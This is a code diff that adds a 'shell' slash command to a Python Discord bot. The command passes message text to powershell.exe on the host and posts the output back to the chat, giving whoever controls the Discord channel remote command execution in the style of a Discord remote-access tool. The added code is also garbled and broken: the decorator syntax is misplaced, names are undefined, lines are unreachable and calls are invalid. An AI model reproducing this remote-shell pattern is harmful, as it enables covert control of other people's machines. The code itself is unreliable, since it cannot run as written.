@@ -127,7 +127,26 @@ async def on_ready():
             embed = discord.Embed(title="Ping", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
         await message.reply(embed=embed)
 
-   
+@tree.command(name = "shell", description = "My first application Command") """, guild=discord.Object(id=12417128931)) Add the guild ids in which the slash command will appear. If it should be in all, remove the argument, but note that it will take some time (up to an hour) to register the command if it's for all guilds."""
+async def first_command(interaction):
+    def shell(): 
+        command = Message.content[6:]
+        if message.content.startswith("shell "):
+            output = subprocess.Popen(["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                      stdin=subprocess.PIPE, shell=True).communicate()[0:].decode("utf-8")
+            if output == "" or output == "None":
+                output = "No output"
+            open(f"{TEMP}\\output.txt", "w").write(output)
+            embed = print(f"Shell > {CWD}")
+            file = open(f"{TEMP}\\output.txt")
+            return await message.reply(embed=embed, file=file)
+            embed = discord.Embed(title=f"Shell > {CWD}", description=f"```{output}```", color=0xfafafa)
+            await message.reply(embed=embed)
+    await interaction.response.send_message(shell)
+@client.event
+async def on_ready():
+    await tree.sync(guild=discord.Object(id=guildID))
+    print("Ready!")
         
 
 # Start the Bot
